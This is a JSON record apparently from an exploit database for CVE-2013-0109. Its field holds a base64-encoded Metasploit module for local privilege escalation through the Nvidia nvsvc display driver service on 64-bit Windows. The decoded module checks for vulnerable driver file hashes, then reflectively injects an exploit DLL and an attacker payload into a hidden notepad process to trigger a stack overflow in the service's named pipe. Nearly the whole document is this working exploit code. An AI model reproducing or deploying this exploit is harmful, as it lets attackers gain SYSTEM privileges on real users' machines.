{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KcmVxdWlyZSAncmV4Jw0KcmVxdWlyZSAnbXNmL2NvcmUvcG9zdC9jb21tb24nDQpyZXF1aXJlICdtc2YvY29yZS9wb3N0L3dpbmRvd3MvcHJpdicNCnJlcXVpcmUgJ21zZi9jb3JlL3Bvc3Qvd2luZG93cy9wcm9jZXNzJw0KcmVxdWlyZSAnbXNmL2NvcmUvcG9zdC93aW5kb3dzL3JlZmxlY3RpdmVfZGxsX2luamVjdGlvbicNCnJlcXVpcmUgJ21zZi9jb3JlL3Bvc3Qvd2luZG93cy9zZXJ2aWNlcycNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OkxvY2FsDQogIFJhbmsgPSBBdmVyYWdlUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpGaWxlDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcml2DQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcm9jZXNzDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpSZWZsZWN0aXZlRExMSW5qZWN0aW9uDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpTZXJ2aWNlcw0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywgew0KICAgICAgJ05hbWUnICAgICAgICAgICAgPT4gJ052aWRpYSAobnZzdmMpIERpc3BsYXkgRHJpdmVyIFNlcnZpY2UgTG9jYWwgUHJpdmlsZWdlIEVzY2FsYXRpb24nLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICAgPT4gJXF7DQogICAgICAgIFRoZSBuYW1lZCBwaXBlLCBccGlwZVxuc3ZyLCBoYXMgYSBOVUxMIERBQ0wgYWxsb3dpbmcgYW55IGF1dGhlbnRpY2F0ZWQgdXNlciB0bw0KICAgICAgICBpbnRlcmFjdCB3aXRoIHRoZSBzZXJ2aWNlLiBJdCBjb250YWlucyBhIHN0YWNrZWQgYmFzZWQgYnVmZmVyIG92ZXJmbG93IGFzIGEgcmVzdWx0DQogICAgICAgIG9mIGEgbWVtbW92ZSBvcGVyYXRpb24uIE5vdGUgdGhlIHNsaWdodCBzcGVsbGluZyBkaWZmZXJlbmNlczogdGhlIGV4ZWN1dGFibGUgaXMgJ252dnN2Yy5leGUnLA0KICAgICAgICB0aGUgc2VydmljZSBuYW1lIGlzICdudnN2YycsIGFuZCB0aGUgbmFtZWQgcGlwZSBpcyAnbnN2cicuDQoNCiAgICAgICAgVGhpcyBleHBsb2l0IGF1dG9tYXRpY2FsbHkgdGFyZ2V0cyBudnZzdmMuZXhlIHZlcnNpb25zIGRhdGVkIE5vdiAzIDIwMTEsIEF1ZyAzMCAyMDEyLCBhbmQgRGVjIDEgMjAxMi4NCiAgICAgICAgSXQgaGFzIGJlZW4gdGVzdGVkIG9uIFdpbmRvd3MgNyA2NC1iaXQgYWdhaW5zdCBudnZzdmMuZXhlIGRhdGVkIERlYyAxIDIwMTIuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ1BldGVyIFdpbnRlcnNtaXRoJywgIyBPcmlnaW5hbCBleHBsb2l0DQogICAgICAgICAgJ0JlbiBDYW1wYmVsbCA8ZWF0X21lYXRiYWxsc1thdF1ob3RtYWlsLmNvLnVrPicsICAgIyBNZXRhc3Bsb2l0IGludGVncmF0aW9uDQogICAgICAgIF0sDQogICAgICAnQXJjaCcgICAgICAgICAgICA9PiBBUkNIX1g4Nl82NCwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgID0+ICd3aW4nLA0KICAgICAgJ1Nlc3Npb25UeXBlcycgICAgPT4gWyAnbWV0ZXJwcmV0ZXInIF0sDQogICAgICAnRGVmYXVsdE9wdGlvbnMnICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0VYSVRGVU5DJyAgICA9PiAndGhyZWFkJywNCiAgICAgICAgfSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdXaW5kb3dzIHg2NCcsIHsgfSBdDQogICAgICAgIF0sDQogICAgICAnUGF5bG9hZCcgICAgICAgICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1NwYWNlJyAgICAgICA9PiAyMDQ4LA0KICAgICAgICAgICdEaXNhYmxlTm9wcycgPT4gdHJ1ZSwNCiAgICAgICAgICAnQmFkQ2hhcnMnICAgID0+ICJceDAwIg0KICAgICAgICB9LA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDEzLTAxMDknIF0sDQogICAgICAgICAgWyAnT1NWREInLCAnODg3NDUnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9udmlkaWEuY3VzdGhlbHAuY29tL2FwcC9hbnN3ZXJzL2RldGFpbC9hX2lkLzMyODgnIF0sDQogICAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdEZWMgMjUgMjAxMicsDQogICAgICAnRGVmYXVsdFRhcmdldCcgID0+IDANCiAgICB9KSkNCg0KICBlbmQNCg0KICBkZWYgY2hlY2sNCiAgICB2dWxuX2hhc2hlcyA9IFsNCiAgICAgICc0M2Y5MTU5NTA0OWRlMTRjNGI2MWQxZTc2NDM2MTY0ZicsDQogICAgICAnMzk0N2FkNWQwM2U2YWJjY2UwMzc4MDExNjJmZGI5MGQnLA0KICAgICAgJzMzNDFkMmM5MTk4OWJjODdjM2MwYmFhOTdjMjcyNTNiJw0KICAgIF0NCg0KICAgIG9zID0gc3lzaW5mb1siT1MiXQ0KICAgIGlmIG9zID1+IC93aW5kb3dzL2kNCiAgICAgIHN2YyA9IHNlcnZpY2VfaW5mbyAnbnZzdmMnDQogICAgICBpZiBzdmMgYW5kIHN2Y1snTmFtZSddID1+IC9OVklESUEvaQ0KICAgICAgICB2cHJpbnRfZ29vZCgiRm91bmQgc2VydmljZSAnI3tzdmNbJ05hbWUnXX0nIikNCg0KICAgICAgICBiZWdpbg0KICAgICAgICAgIGlmIGlzX3J1bm5pbmc/DQogICAgICAgICAgICBwcmludF9nb29kKCJTZXJ2aWNlIGlzIHJ1bm5pbmciKQ0KICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHByaW50X2Vycm9yKCJTZXJ2aWNlIGlzIG5vdCBydW5uaW5nISIpDQogICAgICAgICAgZW5kDQogICAgICAgIHJlc2N1ZSBSdW50aW1lRXJyb3IgPT4gZQ0KICAgICAgICAgIHByaW50X2Vycm9yKCJVbmFibGUgdG8gcmV0cmlldmUgc2VydmljZSBzdGF0dXMiKQ0KICAgICAgICBlbmQNCg0KICAgICAgICBpZiBzeXNpbmZvWydBcmNoaXRlY3R1cmUnXSA9fiAvV09XNjQvaQ0KICAgICAgICAgIHBhdGggPSBzdmNbJ0NvbW1hbmQnXS5nc3ViKCciJywnJykuc3RyaXANCiAgICAgICAgICBwYXRoLmdzdWIhKCJzeXN0ZW0zMiIsInN5c25hdGl2ZSIpDQogICAgICAgIGVsc2UNCiAgICAgICAgICBwYXRoID0gc3ZjWydDb21tYW5kJ10uZ3N1YignIicsJycpLnN0cmlwDQogICAgICAgIGVuZA0KDQogICAgICAgIGJlZ2luDQogICAgICAgICAgaGFzaCA9IGNsaWVudC5mcy5maWxlLm1kNShwYXRoKS51bnBhY2soJ0gqJykuZmlyc3QNCiAgICAgICAgcmVzY3VlIFJleDo6UG9zdDo6TWV0ZXJwcmV0ZXI6OlJlcXVlc3RFcnJvciA9PiBlDQogICAgICAgICAgcHJpbnRfZXJyb3IoIkVycm9yIGNoZWNraW5nIGZpbGUgaGFzaDogI3tlfSIpDQogICAgICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgICAgICAgZW5kDQoNCiAgICAgICAgaWYgdnVsbl9oYXNoZXMuaW5jbHVkZT8oaGFzaCkNCiAgICAgICAgICB2cHJpbnRfZ29vZCgiSGFzaCAnI3toYXNofScgaXMgbGlzdGVkIGFzIHZ1bG5lcmFibGUiKQ0KICAgICAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlZ1bG5lcmFibGUNCiAgICAgICAgZWxzZQ0KICAgICAgICAgIHZwcmludF9zdGF0dXMoIkhhc2ggJyN7aGFzaH0nIGlzIG5vdCByZWNvcmRlZCBhcyB2dWxuZXJhYmxlIikNCiAgICAgICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpEZXRlY3RlZA0KICAgICAgICBlbmQNCiAgICAgIGVsc2UNCiAgICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICAgICAgZW5kDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBpc19ydW5uaW5nPw0KICAgIGJlZ2luDQogICAgICBzdGF0dXMgPSBzZXJ2aWNlX3N0YXR1cygnbnZzdmMnKQ0KICAgICAgcmV0dXJuIChzdGF0dXMgYW5kIHN0YXR1c1s6c3RhdGVdID09IDQpDQogICAgcmVzY3VlIFJ1bnRpbWVFcnJvciA9PiBlDQogICAgICBwcmludF9lcnJvcigiVW5hYmxlIHRvIHJldHJpZXZlIHNlcnZpY2Ugc3RhdHVzIikNCiAgICAgIHJldHVybiBmYWxzZQ0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIGlmIGlzX3N5c3RlbT8NCiAgICAgIGZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpOb25lLCAnU2Vzc2lvbiBpcyBhbHJlYWR5IGVsZXZhdGVkJykNCiAgICBlbmQNCg0KICAgIHVubGVzcyBjaGVjayA9PSBFeHBsb2l0OjpDaGVja0NvZGU6OlZ1bG5lcmFibGUNCiAgICAgIGZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiRXhwbG9pdCBub3QgYXZhaWxhYmxlIG9uIHRoaXMgc3lzdGVtLiIpDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoIkxhdW5jaGluZyBub3RlcGFkIHRvIGhvc3QgdGhlIGV4cGxvaXQuLi4iKQ0KDQogICAgd2luZGlyID0gZXhwYW5kX3BhdGgoIiV3aW5kaXIlIikNCiAgICBjbWQgPSAiI3t3aW5kaXJ9XFxTeXNXT1c2NFxcbm90ZXBhZC5leGUiDQogICAgcHJvY2VzcyA9IGNsaWVudC5zeXMucHJvY2Vzcy5leGVjdXRlKGNtZCwgbmlsLCB7J0hpZGRlbicgPT4gdHJ1ZX0pDQogICAgaG9zdF9wcm9jZXNzID0gY2xpZW50LnN5cy5wcm9jZXNzLm9wZW4ocHJvY2Vzcy5waWQsIFBST0NFU1NfQUxMX0FDQ0VTUykNCiAgICBwcmludF9nb29kKCJQcm9jZXNzICN7cHJvY2Vzcy5waWR9IGxhdW5jaGVkLiIpDQoNCiAgICBwcmludF9zdGF0dXMoIlJlZmxlY3RpdmVseSBpbmplY3RpbmcgdGhlIGV4cGxvaXQgRExMIGludG8gI3twcm9jZXNzLnBpZH0uLi4iKQ0KICAgIGxpYnJhcnlfcGF0aCA9IDo6RmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJleHBsb2l0cyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkNWRS0yMDEzLTAxMDkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJudmlkaWFfbnZzdmMueDg2LmRsbCIpDQogICAgbGlicmFyeV9wYXRoID0gOjpGaWxlLmV4cGFuZF9wYXRoKGxpYnJhcnlfcGF0aCkNCg0KICAgIHByaW50X3N0YXR1cygiSW5qZWN0aW5nIGV4cGxvaXQgaW50byAje3Byb2Nlc3MucGlkfSAuLi4iKQ0KICAgIGV4cGxvaXRfbWVtLCBvZmZzZXQgPSBpbmplY3RfZGxsX2ludG9fcHJvY2Vzcyhob3N0X3Byb2Nlc3MsIGxpYnJhcnlfcGF0aCkNCg0KICAgIHByaW50X3N0YXR1cygiRXhwbG9pdCBpbmplY3RlZC4gSW5qZWN0aW5nIHBheWxvYWQgaW50byAje3Byb2Nlc3MucGlkfS4uLiIpDQogICAgcGF5bG9hZF9tZW0gPSBpbmplY3RfaW50b19wcm9jZXNzKGhvc3RfcHJvY2VzcywgcGF5bG9hZC5lbmNvZGVkKQ0KDQogICAgIyBpbnZva2UgdGhlIGV4cGxvaXQsIHBhc3NpbmcgaW4gdGhlIGFkZHJlc3Mgb2YgdGhlIHBheWxvYWQgdGhhdA0KICAgICMgd2Ugd2FudCBpbnZva2VkIG9uIHN1Y2Nlc3NmdWwgZXhwbG9pdGF0aW9uLg0KICAgIHByaW50X3N0YXR1cygiUGF5bG9hZCBpbmplY3RlZC4gRXhlY3V0aW5nIGV4cGxvaXQuLi4iKQ0KICAgIGhvc3RfcHJvY2Vzcy50aHJlYWQuY3JlYXRlKGV4cGxvaXRfbWVtICsgb2Zmc2V0LCBwYXlsb2FkX21lbSkNCg0KICAgIHByaW50X2dvb2QoIkV4cGxvaXQgZmluaXNoZWQsIHdhaXQgZm9yIChob3BlZnVsbHkgcHJpdmlsZWdlZCkgcGF5bG9hZCBleGVjdXRpb24gdG8gY29tcGxldGUuIikNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/win_x86-64/local/30393.rb", 
    "id": "30393", 
    "cves": [
        "CVE-2013-0109"
    ]
}